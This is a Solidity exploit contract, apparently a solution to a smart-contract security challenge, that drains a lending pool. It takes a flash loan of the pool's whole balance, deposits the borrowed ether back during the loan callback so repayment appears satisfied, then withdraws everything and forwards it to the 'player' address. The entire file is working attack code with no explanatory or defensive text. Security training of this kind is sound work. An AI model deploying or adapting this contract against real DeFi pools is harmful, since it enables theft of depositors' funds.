// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract Attacker {
    IPool immutable pool;
    address immutable player;

    constructor(address _pool, address _player) {
        pool = IPool(_pool);
        player = _player;
    }

    function attack() external payable {
        // 1. Pre-flashloan
        pool.flashLoan(address(pool).balance);

        // 3. Post-flashloan
        pool.withdraw();
        (bool success, ) = player.call{ value: address(this).balance }(""); // Gives funds to player
    }

    function execute() external payable {
        // 2. During flashloan
        require(tx.origin == player);
        require(msg.sender == address(pool));

        pool.deposit{ value: msg.value }();
    }

    receive() external payable {}
}
